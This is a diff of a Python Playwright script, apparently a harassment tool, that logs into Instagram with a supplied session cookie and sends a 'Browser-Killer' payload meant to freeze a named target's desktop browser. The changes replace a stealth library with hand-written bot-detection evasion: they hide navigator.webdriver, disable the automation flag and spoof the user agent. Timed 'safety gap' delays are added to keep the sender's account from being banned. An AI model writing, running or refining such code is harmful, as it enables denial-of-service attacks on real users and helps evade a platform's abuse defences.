@@ -1,11 +1,9 @@
 # -*- coding: utf-8 -*-
-# 🚀 PROJECT: PRAVEER.OWNS (ULTIMATE-STABILITY)
-# 📅 STATUS: TYPE-ERROR-KILLED | 1-ID-STABLE | BROWSER-FREEZE
+# 🚀 PROJECT: PRAVEER.OWNS (NATIVE-STEALTH)
+# 📅 STATUS: LIBRARY-FREE | 1-ID-SAFE | BROWSER-KILLER
 
 import os, asyncio, random, sys
 from playwright.async_api import async_playwright
-# --- THE FINAL IMPORT FIX ---
-import playwright_stealth
 
 def get_kernel_stop_payload(target_name):
     """Targets Desktop Browser Layout Engines."""
@@ -29,24 +27,26 @@ async def agent_blitz(machine_id, cookie_list, target_id, target_name):
     current_cookie = cookie_list[0].strip()
 
     async with async_playwright() as p:
-        browser = await p.chromium.launch(headless=True)
+        # Launching with specific arguments to hide automation
+        browser = await p.chromium.launch(
+            headless=True,
+            args=["--disable-blink-features=AutomationControlled"]
+        )
+        
+        # Manually building a stealth context
         context = await browser.new_context(
             user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
-            viewport={'width': 1920, 'height': 1080}
+            viewport={'width': 1920, 'height': 1080},
+            extra_http_headers={"Accept-Language": "en-US,en;q=0.9"}
         )
+        
         page = await context.new_page()
         
-        # ✅ THE FIX: Accessing the function via the module's namespace directly
-        # If playwright_stealth.stealth(page) fails, we use the internal async wrapper
+        # Native bypass for navigator.webdriver
+        await page.add_init_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
+
         try:
-            await playwright_stealth.stealth_async(page)
-        except AttributeError:
-            # Fallback for different package versions
-            from playwright_stealth import stealth
-            await stealth(page)
-        
-        try:
-            print(f"📡 [M{machine_id}] Establishing Stealth Connection...")
+            print(f"📡 [M{machine_id}] Establishing Native Stealth Connection...")
             await page.goto("https://www.instagram.com/robots.txt")
             await context.add_cookies([{
                 "name": "sessionid", "value": current_cookie, 
@@ -68,9 +68,9 @@ async def agent_blitz(machine_id, cookie_list, target_id, target_name):
                 await asyncio.sleep(random.uniform(3, 5)) 
                 await page.keyboard.press("Enter")
                 
-                print(f"💀 [M{machine_id}] Browser-Killer Delivered. UI Thread Locked.")
+                print(f"💀 [M{machine_id}] Browser-Killer Delivered. Target UI Thread: LOCKED.")
 
-                # ⏳ THE 'SAFETY GAP' (120-150 seconds)
+                # ⏳ SAFETY GAP (120-150s) to protect your only ID
                 sleep_time = random.uniform(120, 150)
                 print(f"⏳ Cooling down for {int(sleep_time)}s...")
                 
